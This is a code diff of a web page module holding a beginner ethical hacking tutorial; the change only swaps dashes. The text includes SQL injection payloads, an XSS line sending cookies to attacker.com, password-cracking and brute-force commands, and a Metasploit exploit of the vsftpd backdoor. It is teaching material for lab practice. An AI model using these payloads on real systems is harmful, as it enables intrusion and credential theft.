@@ -1,8 +1,8 @@
 export const CONTENT = `
-      <p>Ethical hacking — also called <strong>penetration testing</strong> or <strong>white-hat hacking</strong> — is the practice of legally breaking into systems to find vulnerabilities <em>before</em> malicious hackers do. It's one of the most in-demand skills in cybersecurity, and you don't need a CS degree to get started. This tutorial will take you from zero to running your first penetration test, step by step.</p>
+      <p>Ethical hacking - also called <strong>penetration testing</strong> or <strong>white-hat hacking</strong> - is the practice of legally breaking into systems to find vulnerabilities <em>before</em> malicious hackers do. It's one of the most in-demand skills in cybersecurity, and you don't need a CS degree to get started. This tutorial will take you from zero to running your first penetration test, step by step.</p>
 
       <h2>What is Ethical Hacking?</h2>
-      <p>An ethical hacker does the same things a criminal hacker does — reconnaissance, scanning, exploitation — but with <strong>written permission</strong> from the system owner. The goal is to find and report vulnerabilities so they can be fixed, not exploited.</p>
+      <p>An ethical hacker does the same things a criminal hacker does - reconnaissance, scanning, exploitation - but with <strong>written permission</strong> from the system owner. The goal is to find and report vulnerabilities so they can be fixed, not exploited.</p>
 
       <!-- Ethical vs Malicious -->
       <div class="flow-diagram">
@@ -22,7 +22,7 @@ export const CONTENT = `
           <div class="vs-card" style="border-color:#ef4444">
             <div class="vs-card-header" style="background:#ef4444">&#x1F47E; Malicious Hacker (Black Hat)</div>
             <div class="vs-card-body">
-              <div class="vs-row"><span class="vs-row-icon">&#x1F6AB;</span>No permission — unauthorized</div>
+              <div class="vs-row"><span class="vs-row-icon">&#x1F6AB;</span>No permission - unauthorized</div>
               <div class="vs-row"><span class="vs-row-icon">&#x1F4A3;</span>Goal: steal, damage, or extort</div>
               <div class="vs-row"><span class="vs-row-icon">&#x1F4B8;</span>Sells data on the dark web</div>
               <div class="vs-row"><span class="vs-row-icon">&#x26D4;</span>Violates laws (CFAA, CMA, etc.)</div>
@@ -59,9 +59,9 @@ export const CONTENT = `
         <div class="flow-diagram-title">Your Ethical Hacking Lab Setup</div>
         <div class="layer-diagram">
           <div class="layer-item" style="background:#3b82f6">Your Host Machine (Windows / macOS / Linux)<span class="layer-item-sub">Runs VirtualBox or VMware to host virtual machines</span></div>
-          <div class="layer-item" style="background:#22c55e">Kali Linux VM (Attacker)<span class="layer-item-sub">Pre-loaded with 600+ hacking tools — your main workspace</span></div>
-          <div class="layer-item" style="background:#ef4444">Vulnerable VMs (Targets)<span class="layer-item-sub">Metasploitable, DVWA, HackTheBox, TryHackMe — practice safely</span></div>
-          <div class="layer-item" style="background:#7c3aed">Isolated Network (Host-Only)<span class="layer-item-sub">VMs talk to each other only — no traffic reaches the internet</span></div>
+          <div class="layer-item" style="background:#22c55e">Kali Linux VM (Attacker)<span class="layer-item-sub">Pre-loaded with 600+ hacking tools - your main workspace</span></div>
+          <div class="layer-item" style="background:#ef4444">Vulnerable VMs (Targets)<span class="layer-item-sub">Metasploitable, DVWA, HackTheBox, TryHackMe - practice safely</span></div>
+          <div class="layer-item" style="background:#7c3aed">Isolated Network (Host-Only)<span class="layer-item-sub">VMs talk to each other only - no traffic reaches the internet</span></div>
         </div>
       </div>
 
@@ -87,12 +87,12 @@ ping 192.168.56.101   # Ping your target VM from Kali</code></pre>
       <p>Before touching a target system, gather as much information as possible. This is called <strong>recon</strong> or <strong>OSINT</strong> (Open Source Intelligence). The more you know, the more targeted your attack can be.</p>
 
       <h2>Passive Reconnaissance</h2>
-      <p>Passive recon means gathering information <em>without directly interacting</em> with the target. You're reading publicly available data — no laws broken, no alerts triggered.</p>
-      <pre><code># WHOIS lookup — who owns the domain?
+      <p>Passive recon means gathering information <em>without directly interacting</em> with the target. You're reading publicly available data - no laws broken, no alerts triggered.</p>
+      <pre><code># WHOIS lookup - who owns the domain?
 whois example.com
 # Shows: registrant name, email, name servers, creation date
 
-# DNS enumeration — discover subdomains and mail servers
+# DNS enumeration - discover subdomains and mail servers
 dig example.com ANY
 dig example.com MX          # Mail servers
 dig example.com NS          # Name servers
@@ -103,31 +103,31 @@ host -t txt example.com     # TXT records (SPF, DKIM)
 sublist3r -d example.com
 # Finds: mail.example.com, dev.example.com, staging.example.com, etc.
 
-# Google Dorking — use Google to find exposed files
+# Google Dorking - use Google to find exposed files
 # site:example.com filetype:pdf        (find PDFs)
 # site:example.com intitle:"index of"  (find directory listings)
 # site:example.com inurl:admin         (find admin panels)
 # site:example.com ext:sql             (find SQL files)
 
-# Shodan — search engine for internet-connected devices
+# Shodan - search engine for internet-connected devices
 # https://www.shodan.io/search?query=hostname:example.com
 # Shows: open ports, services, SSL certs, known vulnerabilities
 
-# theHarvester — gather emails, names, subdomains
+# theHarvester - gather emails, names, subdomains
 theHarvester -d example.com -b google,linkedin,dnsdumpster</code></pre>
 
       <h2>Active Reconnaissance</h2>
-      <p>Active recon involves <strong>directly interacting</strong> with the target — sending packets, making requests. This can be detected by the target's security systems.</p>
-      <pre><code># Ping sweep — which hosts are alive on the network?
+      <p>Active recon involves <strong>directly interacting</strong> with the target - sending packets, making requests. This can be detected by the target's security systems.</p>
+      <pre><code># Ping sweep - which hosts are alive on the network?
 nmap -sn 192.168.56.0/24
 # Output: Host 192.168.56.101 is up (0.0012s latency)
 
-# Banner grabbing — what software is running?
+# Banner grabbing - what software is running?
 nc -v 192.168.56.101 80
 # Then type: HEAD / HTTP/1.1
 # Response reveals: Apache/2.4.7, PHP/5.5.9, Ubuntu
 
-# Traceroute — map the network path
+# Traceroute - map the network path
 traceroute example.com</code></pre>
 
       <h2>Phase 2: Scanning &amp; Enumeration</h2>
@@ -144,7 +144,7 @@ traceroute example.com</code></pre>
         </div>
       </div>
 
-      <h2>Nmap — The Network Mapper</h2>
+      <h2>Nmap - The Network Mapper</h2>
       <pre><code># Basic port scan (top 1000 ports)
 nmap 192.168.56.101
 # Output:
@@ -172,17 +172,17 @@ sudo nmap -p- 192.168.56.101
 nmap --script vuln 192.168.56.101
 # Checks for known CVEs in the detected services
 
-# Stealth scan (SYN scan — doesn't complete TCP handshake)
+# Stealth scan (SYN scan - doesn't complete TCP handshake)
 sudo nmap -sS 192.168.56.101
 
-# UDP scan (important — many services run on UDP)
+# UDP scan (important - many services run on UDP)
 sudo nmap -sU --top-ports 50 192.168.56.101
 
 # Output to file for later analysis
 nmap -sV -oN scan-results.txt 192.168.56.101</code></pre>
 
       <h2>Web Application Scanning</h2>
-      <pre><code># Nikto — web vulnerability scanner
+      <pre><code># Nikto - web vulnerability scanner
 nikto -h http://192.168.56.101
 # Checks for: outdated software, dangerous files, misconfigurations
 # Output: + Server: Apache/2.2.8
@@ -196,7 +196,7 @@ dirb http://192.168.56.101 /usr/share/wordlists/dirb/common.txt
 # Gobuster (faster alternative to Dirb)
 gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt
 
-# WPScan — WordPress-specific scanner
+# WPScan - WordPress-specific scanner
 wpscan --url http://192.168.56.101/wordpress --enumerate u,vp,vt
 # Enumerates: users, vulnerable plugins, vulnerable themes</code></pre>
 
@@ -205,7 +205,7 @@ wpscan --url http://192.168.56.101/wordpress --enumerate u,vp,vt
 
       <!-- Common Vulnerabilities -->
       <div class="flow-diagram">
-        <div class="flow-diagram-title">OWASP Top 10 — Most Common Web Vulnerabilities</div>
+        <div class="flow-diagram-title">OWASP Top 10 - Most Common Web Vulnerabilities</div>
         <div class="timeline">
           <div class="timeline-item" style="--c:#ef4444"><div class="timeline-item-title" style="color:#ef4444">1. Broken Access Control</div><div class="timeline-item-desc">Users accessing unauthorized data or functions</div></div>
           <div class="timeline-item" style="--c:#f97316"><div class="timeline-item-title" style="color:#f97316">2. Cryptographic Failures</div><div class="timeline-item-desc">Weak encryption, exposed sensitive data</div></div>
@@ -217,7 +217,7 @@ wpscan --url http://192.168.56.101/wordpress --enumerate u,vp,vt
         </div>
       </div>
 
-      <h2>SQL Injection (SQLi) — Hands-On Example</h2>
+      <h2>SQL Injection (SQLi) - Hands-On Example</h2>
       <p>SQL injection is one of the most dangerous and common vulnerabilities. It happens when user input is inserted directly into SQL queries without sanitization.</p>
       <pre><code># Vulnerable login form (PHP backend)
 # The server runs this query:
@@ -236,7 +236,7 @@ Password: anything
 # Result: Logged in as admin without knowing the password
 
 # More SQLi payloads:
-' OR '1'='1                    # Always true — dumps all rows
+' OR '1'='1                    # Always true - dumps all rows
 ' UNION SELECT 1,2,3,4 --     # Extract data from other tables
 ' UNION SELECT username,password FROM users --  # Dump credentials</code></pre>
 
@@ -257,18 +257,18 @@ sqlmap -u "http://192.168.56.101/page.php?id=1" -D mydb -T users --dump
 
       <h2>Cross-Site Scripting (XSS)</h2>
       <p>XSS lets attackers inject malicious JavaScript into web pages viewed by other users.</p>
-      <pre><code># Reflected XSS — input is reflected back without sanitization
+      <pre><code># Reflected XSS - input is reflected back without sanitization
 # Vulnerable URL: http://example.com/search?q=USER_INPUT
 
 # Test payload (shows an alert box):
 http://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
 
-# Stored XSS — payload is saved in the database
+# Stored XSS - payload is saved in the database
 # Example: a comment field that doesn't sanitize HTML
 Comment: &lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;
 # Every user who views this comment sends their cookies to the attacker
 
-# DOM-based XSS — manipulating the page's JavaScript
+# DOM-based XSS - manipulating the page's JavaScript
 # XSS Prevention:
 # 1. Always escape/encode user output
 # 2. Use Content-Security-Policy headers
@@ -284,7 +284,7 @@ echo 'admin:5f4dcc3b5aa765d61d8327deb882cf99' > hashes.txt
 john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 # Output: password (admin)
 
-# Using Hashcat (GPU-accelerated — much faster)
+# Using Hashcat (GPU-accelerated - much faster)
 hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
 # -m 0: MD5 hash type
 # -a 0: dictionary attack
@@ -302,7 +302,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
 msfconsole
 
 # Example: Exploiting vsftpd 2.3.4 backdoor (a famous vulnerability)
-# This backdoor was discovered in 2011 — vsftpd 2.3.4 has a built-in
+# This backdoor was discovered in 2011 - vsftpd 2.3.4 has a built-in
 # backdoor that opens a shell on port 6200 when you login with a
 # username ending in ":)"
 
@@ -325,7 +325,7 @@ cat /etc/shadow  # Password hashes for all users
 ifconfig      # Network configuration</code></pre>
 
       <h2>Phase 4: Post-Exploitation</h2>
-      <p>After gaining access, the next phase is understanding the scope of the compromise — what data is accessible, can you move laterally, can you escalate privileges?</p>
+      <p>After gaining access, the next phase is understanding the scope of the compromise - what data is accessible, can you move laterally, can you escalate privileges?</p>
       <pre><code># Linux privilege escalation checks
 whoami                    # Current user
 id                        # User ID and groups
@@ -359,10 +359,10 @@ systeminfo                # OS details, hotfixes (missing patches = vulns)</code
       <div class="flow-diagram">
         <div class="flow-diagram-title">Penetration Test Report Structure</div>
         <div class="layer-diagram">
-          <div class="layer-item" style="background:#3b82f6">Executive Summary<span class="layer-item-sub">Non-technical overview for management — risk level, key findings, business impact</span></div>
+          <div class="layer-item" style="background:#3b82f6">Executive Summary<span class="layer-item-sub">Non-technical overview for management - risk level, key findings, business impact</span></div>
           <div class="layer-item" style="background:#7c3aed">Scope &amp; Methodology<span class="layer-item-sub">What was tested, what tools were used, testing timeline</span></div>
           <div class="layer-item" style="background:#ef4444">Findings (Critical &#x2192; Low)<span class="layer-item-sub">Each vulnerability: description, evidence (screenshots), CVSS score, affected systems</span></div>
-          <div class="layer-item" style="background:#f97316">Remediation Recommendations<span class="layer-item-sub">Specific fixes for each finding — code changes, config updates, patches</span></div>
+          <div class="layer-item" style="background:#f97316">Remediation Recommendations<span class="layer-item-sub">Specific fixes for each finding - code changes, config updates, patches</span></div>
           <div class="layer-item" style="background:#22c55e">Appendices<span class="layer-item-sub">Raw scan output, full exploit logs, tool configurations</span></div>
         </div>
       </div>
@@ -405,13 +405,13 @@ Info     (0.0):      Observations, best practices, no direct risk</code></pre>
       <h2>Where to Practice (Legally)</h2>
       <p>These platforms provide intentionally vulnerable environments for learning:</p>
       <ul>
-        <li><strong>TryHackMe</strong> (tryhackme.com) — Browser-based, guided rooms, perfect for beginners. Free tier available.</li>
-        <li><strong>HackTheBox</strong> (hackthebox.com) — More challenging, real-world-like machines. Great for intermediate learners.</li>
-        <li><strong>DVWA</strong> (Damn Vulnerable Web App) — Self-hosted PHP app with adjustable difficulty levels.</li>
-        <li><strong>OverTheWire</strong> (overthewire.org) — Linux command-line challenges (Bandit series is great for beginners).</li>
-        <li><strong>PortSwigger Web Security Academy</strong> — Free labs for learning web vulnerabilities from the makers of Burp Suite.</li>
-        <li><strong>PicoCTF</strong> — Capture The Flag competitions designed for students.</li>
-        <li><strong>VulnHub</strong> — Download vulnerable VMs for your local lab.</li>
+        <li><strong>TryHackMe</strong> (tryhackme.com) - Browser-based, guided rooms, perfect for beginners. Free tier available.</li>
+        <li><strong>HackTheBox</strong> (hackthebox.com) - More challenging, real-world-like machines. Great for intermediate learners.</li>
+        <li><strong>DVWA</strong> (Damn Vulnerable Web App) - Self-hosted PHP app with adjustable difficulty levels.</li>
+        <li><strong>OverTheWire</strong> (overthewire.org) - Linux command-line challenges (Bandit series is great for beginners).</li>
+        <li><strong>PortSwigger Web Security Academy</strong> - Free labs for learning web vulnerabilities from the makers of Burp Suite.</li>
+        <li><strong>PicoCTF</strong> - Capture The Flag competitions designed for students.</li>
+        <li><strong>VulnHub</strong> - Download vulnerable VMs for your local lab.</li>
       </ul>
 
       <h2>Certifications Path</h2>
@@ -439,16 +439,16 @@ Info     (0.0):      Observations, best practices, no direct risk</code></pre>
         <li><strong>Contact the organization</strong> directly (look for a security.txt file at /.well-known/security.txt or a bug bounty program).</li>
         <li><strong>Give them time</strong> to fix it (typically 90 days) before disclosing publicly.</li>
         <li><strong>Don't share the vulnerability</strong> with others before it's patched.</li>
-        <li><strong>Many companies pay bounties</strong> — check HackerOne and Bugcrowd for active programs.</li>
+        <li><strong>Many companies pay bounties</strong> - check HackerOne and Bugcrowd for active programs.</li>
       </ul>
 
       <h2>Legal &amp; Ethical Guidelines</h2>
       <ul>
         <li><strong>Always get written permission</strong> before testing any system. A verbal agreement is not enough.</li>
-        <li><strong>Define the scope clearly</strong> — which systems, which methods, what time window.</li>
+        <li><strong>Define the scope clearly</strong> - which systems, which methods, what time window.</li>
         <li><strong>Know your laws:</strong> CFAA (USA), Computer Misuse Act (UK), IT Act (India). Unauthorized access is a criminal offense everywhere.</li>
         <li><strong>Use your powers for good.</strong> The difference between a security professional and a criminal is permission and intent.</li>
       </ul>
 
-      <p>Ethical hacking is one of the most rewarding career paths in tech. You get paid to think like a criminal, break into systems, and make the internet safer. Start with TryHackMe, build your lab, learn the tools, and practice every day. The cybersecurity industry has a massive talent shortage — your skills are needed.</p>
+      <p>Ethical hacking is one of the most rewarding career paths in tech. You get paid to think like a criminal, break into systems, and make the internet safer. Start with TryHackMe, build your lab, learn the tools, and practice every day. The cybersecurity industry has a massive talent shortage - your skills are needed.</p>
     `;
